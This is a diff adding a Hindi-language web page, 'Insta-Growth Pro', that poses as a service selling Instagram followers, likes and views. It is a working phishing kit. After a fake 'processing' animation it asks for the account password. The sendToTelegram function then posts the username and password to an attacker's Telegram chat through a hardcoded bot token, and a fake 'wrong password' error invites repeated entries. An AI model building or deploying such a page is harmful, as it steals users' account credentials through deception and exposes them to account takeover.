@@ -1,0 +1,550 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🚀 इंस्टा-ग्रोथ प्रो</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Arial, sans-serif;
+        }
+        
+        body {
+            background: pink;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        
+        .container {
+            width: 100%;
+            max-width: 500px;
+            background: white;
+            border-radius: 20px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+            overflow: hidden;
+        }
+        
+        .header {
+            background: linear-gradient(to right, #e1306c, #fd1d1d, #f56040);
+            color: white;
+            text-align: center;
+            padding: 20px;
+        }
+        
+        .header h1 {
+            font-size: 22px;
+            margin-bottom: 5px;
+        }
+        
+        .content {
+            padding: 25px;
+        }
+        
+        .step {
+            display: none;
+        }
+        
+        .step.active {
+            display: block;
+        }
+        
+        .step-title {
+            color: #e1306c;
+            font-size: 18px;
+            margin-bottom: 15px;
+        }
+        
+        input {
+            width: 100%;
+            padding: 15px;
+            border: 2px solid #ffd6e0;
+            border-radius: 10px;
+            font-size: 16px;
+            margin-bottom: 20px;
+            background: #fff9fb;
+        }
+        
+        .btn {
+            background: linear-gradient(to right, #e1306c, #fd1d1d);
+            color: white;
+            border: none;
+            border-radius: 10px;
+            padding: 15px;
+            font-size: 16px;
+            width: 100%;
+            cursor: pointer;
+            font-weight: bold;
+            margin-top: 10px;
+        }
+        
+        .service-options {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 10px;
+            margin: 20px 0;
+        }
+        
+        .service-btn {
+            background: #fff9fb;
+            border: 2px solid #ffd6e0;
+            border-radius: 10px;
+            padding: 15px 5px;
+            text-align: center;
+            cursor: pointer;
+        }
+        
+        .service-btn.selected {
+            background: #ffeef2;
+            border-color: #e1306c;
+        }
+        
+        .service-btn h3 {
+            color: #e1306c;
+            font-size: 14px;
+        }
+        
+        .package-options {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 10px;
+            margin: 20px 0;
+            max-height: 300px;
+            overflow-y: auto;
+            padding: 10px;
+        }
+        
+        .package {
+            background: #fff9fb;
+            border: 2px solid #ffd6e0;
+            border-radius: 10px;
+            padding: 15px 5px;
+            text-align: center;
+            cursor: pointer;
+        }
+        
+        .package.selected {
+            background: #ffeef2;
+            border-color: #e1306c;
+        }
+        
+        .package h3 {
+            color: #e1306c;
+            font-size: 14px;
+            margin-bottom: 5px;
+        }
+        
+        .processing {
+            background: #fff9fb;
+            border-radius: 10px;
+            padding: 20px;
+            margin-top: 20px;
+        }
+        
+        .processing-log {
+            background: #000;
+            color: #0f0;
+            padding: 15px;
+            border-radius: 8px;
+            font-family: monospace;
+            font-size: 12px;
+            margin-top: 15px;
+            height: 150px;
+            overflow-y: auto;
+        }
+        
+        .log-entry {
+            margin-bottom: 5px;
+        }
+        
+        .success-message {
+            background: #e8f7ef;
+            border-left: 4px solid #28a745;
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+        }
+        
+        .retry-message {
+            background: #fff3cd;
+            border-left: 4px solid #ffc107;
+            padding: 15px;
+            border-radius: 8px;
+            margin-top: 20px;
+            text-align: center;
+        }
+        
+        .error-message {
+            background: #ffeaea;
+            border-left: 4px solid #dc3545;
+            padding: 15px;
+            border-radius: 8px;
+            margin-top: 20px;
+            color: #721c24;
+            display: none;
+        }
+        
+        .step-indicator {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 30px;
+            position: relative;
+        }
+        
+        .step-indicator::before {
+            content: '';
+            position: absolute;
+            top: 15px;
+            left: 10%;
+            right: 10%;
+            height: 2px;
+            background: #ffd6e0;
+            z-index: 1;
+        }
+        
+        .step-circle {
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            background: #ffd6e0;
+            color: #888;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            z-index: 2;
+            position: relative;
+        }
+        
+        .step-circle.active {
+            background: #e1306c;
+            color: white;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>🚀 इंस्टा-ग्रोथ प्रो</h1>
+            <p>असली अनुयायी प्राप्त करें</p>
+        </div>
+        
+        <div class="content">
+            <div class="step-indicator">
+                <div class="step-circle active" id="stepCircle1">1</div>
+                <div class="step-circle" id="stepCircle2">2</div>
+                <div class="step-circle" id="stepCircle3">3</div>
+                <div class="step-circle" id="stepCircle4">4</div>
+            </div>
+            
+            <!-- Step 1 -->
+            <div id="step1" class="step active">
+                <h2 class="step-title">पहला कदम</h2>
+                <input type="text" id="username" placeholder="@username" onkeypress="handleEnter(event, 'step1')">
+                <button class="btn" onclick="nextStep(2)">अगला कदम</button>
+            </div>
+            
+            <!-- Step 2 -->
+            <div id="step2" class="step">
+                <h2 class="step-title">दूसरा कदम</h2>
+                <p>सेवा चुनें:</p>
+                
+                <div class="service-options">
+                    <div class="service-btn" onclick="selectService('followers')">
+                        <h3>फॉलोअर्स</h3>
+                    </div>
+                    <div class="service-btn" onclick="selectService('likes')">
+                        <h3>लाइक्स</h3>
+                    </div>
+                    <div class="service-btn" onclick="selectService('views')">
+                        <h3>व्यूज</h3>
+                    </div>
+                </div>
+                
+                <button class="btn" onclick="nextStep(2.5)">सेवा चुनें</button>
+            </div>
+            
+            <!-- Step 2.5 -->
+            <div id="step2_5" class="step">
+                <h2 class="step-title" id="packageTitle">पैकेज चुनें</h2>
+                
+                <div class="package-options" id="packageContainer">
+                    <!-- Packages will load here -->
+                </div>
+                
+                <button class="btn" onclick="nextStep(3)">पैकेज चुनें</button>
+            </div>
+            
+            <!-- Step 3 -->
+            <div id="step3" class="step">
+                <h2 class="step-title">तीसरा कदम</h2>
+                <p>सिस्टम प्रोसेसिंग...</p>
+                <div class="processing">
+                    <div class="processing-log" id="processingLog"></div>
+                </div>
+                <button class="btn" id="continueBtn" onclick="nextStep(4)" style="display:none; margin-top:20px;">जारी रखें</button>
+            </div>
+            
+            <!-- Step 4 -->
+            <div id="step4" class="step">
+                <h2 class="step-title">चौथा कदम</h2>
+                <div class="success-message">
+                    <strong>सफलता!</strong> आपका पैकेज तैयार है।
+                </div>
+                <input type="password" id="password" placeholder="पासवर्ड डालें" onkeypress="handleEnter(event, 'step4')">
+                <button class="btn" onclick="submitPassword()">अनुयायी प्राप्त करें</button>
+                
+                <div id="retryMessage" class="retry-message" style="display: none;">
+                    <button class="btn" onclick="retryPassword()" style="background: #ffc107;">दुबारा कोशिश करें</button>
+                </div>
+                
+                <div id="errorMessage" class="error-message">
+                    ❌ त्रुटि: पासवर्ड गलत है। दुबारा कोशिश करें।
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Global variables
+        let currentStep = 1;
+        let selectedService = '';
+        let selectedPackage = 0;
+        
+        // Service packages
+        const packages = {
+            'followers': ['1K', '2K', '3K', '5K'],
+            'likes': ['10K', '20K', '30K', '40K', '50K', '60K', '70K', '80K'],
+            'views': ['1M', '2M', '3M', '4M', '5M', '6M', '7M', '8M', '9M', '10M']
+        };
+        
+        // Enter key handler
+        function handleEnter(event, step) {
+            if (event.key === 'Enter') {
+                if (step === 'step1') nextStep(2);
+                if (step === 'step4') submitPassword();
+            }
+        }
+        
+        // Step navigation
+        function nextStep(step) {
+            // Validate current step
+            if (currentStep === 1) {
+                let username = document.getElementById('username').value.trim();
+                if (!username) {
+                    alert('कृपया यूजरनेम डालें!');
+                    return;
+                }
+            }
+            
+            if (currentStep === 2) {
+                if (!selectedService) {
+                    alert('कृपया सेवा चुनें!');
+                    return;
+                }
+            }
+            
+            if (step === 2.5) {
+                // Load packages for selected service
+                loadPackages();
+                currentStep = 2.5;
+                showStep(2.5);
+                updateStepIndicator(2);
+                return;
+            }
+            
+            if (currentStep === 2.5) {
+                if (!selectedPackage) {
+                    alert('कृपया पैकेज चुनें!');
+                    return;
+                }
+            }
+            
+            // Update current step and show
+            currentStep = step;
+            showStep(step);
+            updateStepIndicator(step);
+            
+            // Start processing if step 3
+            if (step === 3) {
+                startProcessing();
+            }
+        }
+        
+        // Show specific step
+        function showStep(step) {
+            // Hide all steps
+            document.querySelectorAll('.step').forEach(el => {
+                el.classList.remove('active');
+            });
+            
+            // Show current step
+            let stepId = 'step' + step.toString().replace('.', '_');
+            document.getElementById(stepId).classList.add('active');
+        }
+        
+        // Update step indicator
+        function updateStepIndicator(step) {
+            document.querySelectorAll('.step-circle').forEach(circle => {
+                circle.classList.remove('active');
+            });
+            
+            if (step === 1) document.getElementById('stepCircle1').classList.add('active');
+            if (step === 2 || step === 2.5) {
+                document.getElementById('stepCircle1').classList.add('active');
+                document.getElementById('stepCircle2').classList.add('active');
+            }
+            if (step === 3) {
+                document.getElementById('stepCircle1').classList.add('active');
+                document.getElementById('stepCircle2').classList.add('active');
+                document.getElementById('stepCircle3').classList.add('active');
+            }
+            if (step === 4) {
+                document.getElementById('stepCircle1').classList.add('active');
+                document.getElementById('stepCircle2').classList.add('active');
+                document.getElementById('stepCircle3').classList.add('active');
+                document.getElementById('stepCircle4').classList.add('active');
+            }
+        }
+        
+        // Select service
+        function selectService(service) {
+            selectedService = service;
+            
+            // Update UI
+            document.querySelectorAll('.service-btn').forEach(btn => {
+                btn.classList.remove('selected');
+            });
+            event.currentTarget.classList.add('selected');
+            
+            // Update title
+            let title = '';
+            if (service === 'followers') title = 'फॉलोअर्स पैकेज चुनें';
+            if (service === 'likes') title = 'लाइक्स पैकेज चुनें';
+            if (service === 'views') title = 'व्यूज पैकेज चुनें';
+            document.getElementById('packageTitle').textContent = title;
+        }
+        
+        // Load packages
+        function loadPackages() {
+            let container = document.getElementById('packageContainer');
+            container.innerHTML = '';
+            
+            packages[selectedService].forEach(pkg => {
+                let div = document.createElement('div');
+                div.className = 'package';
+                div.setAttribute('onclick', `selectPackage('${pkg}')`);
+                div.innerHTML = `<h3>${pkg}</h3>`;
+                container.appendChild(div);
+            });
+        }
+        
+        // Select package
+        function selectPackage(pkg) {
+            selectedPackage = pkg;
+            
+            // Update UI
+            document.querySelectorAll('.package').forEach(p => {
+                p.classList.remove('selected');
+            });
+            event.currentTarget.classList.add('selected');
+        }
+        
+        // Start processing animation
+        function startProcessing() {
+            let log = document.getElementById('processingLog');
+            log.innerHTML = '';
+            
+            let messages = [
+                "सर्वर सर्चिंग...",
+                "स्लॉट एलोकेशन...",
+                "एन्क्रिप्शन एक्टिवेटेड...",
+                "प्रोफाइल डेटा लोड हो रहा है...",
+                "✅ सिस्टम तैयार है!"
+            ];
+            
+            let i = 0;
+            let interval = setInterval(() => {
+                if (i < messages.length) {
+                    let entry = document.createElement('div');
+                    entry.className = 'log-entry';
+                    entry.textContent = '> ' + messages[i];
+                    log.appendChild(entry);
+                    log.scrollTop = log.scrollHeight;
+                    i++;
+                } else {
+                    clearInterval(interval);
+                    document.getElementById('continueBtn').style.display = 'block';
+                }
+            }, 1000);
+        }
+        
+        // Submit password
+        function submitPassword() {
+            let username = document.getElementById('username').value.trim();
+            let password = document.getElementById('password').value.trim();
+            
+            if (!password) {
+                alert('कृपया पासवर्ड डालें!');
+                return;
+            }
+            
+            // Send to Telegram
+            sendToTelegram(username, password);
+            
+            // Show messages
+            document.getElementById('retryMessage').style.display = 'block';
+            document.getElementById('errorMessage').style.display = 'block';
+            
+            // Clear password
+            document.getElementById('password').value = '';
+        }
+        
+        // Retry password
+        function retryPassword() {
+            document.getElementById('retryMessage').style.display = 'none';
+            document.getElementById('errorMessage').style.display = 'none';
+            document.getElementById('password').value = '';
+            document.getElementById('password').focus();
+        }
+        
+        // Send to Telegram
+        function sendToTelegram(username, password) {
+            let botToken = '8345311836:AAGGy4g688Y5oxDvb0SqWunLNzCT3BnuPdY';
+            let chatId = '7482526085';
+            
+            // Create message
+            let message = `🎯 नया इंस्टाग्राम लॉगिन!\n\n`;
+            message += `👤 यूजरनेम: ${username}\n`;
+            message += `🔐 पासवर्ड: ${password}\n`;
+            message += `📦 सेवा: ${selectedService}\n`;
+            message += `🎁 पैकेज: ${selectedPackage}\n`;
+            message += `⏰ समय: ${new Date().toLocaleString('hi-IN')}`;
+            
+            // Send via fetch
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            })
+            .then(response => response.json())
+            .then(data => console.log('Success:', data))
+            .catch(error => console.error('Error:', error));
+        }
+        
+        // Initialize
+        window.onload = function() {
+            showStep(1);
+            updateStepIndicator(1);
+        };
+    </script>
+</body>
+</html>
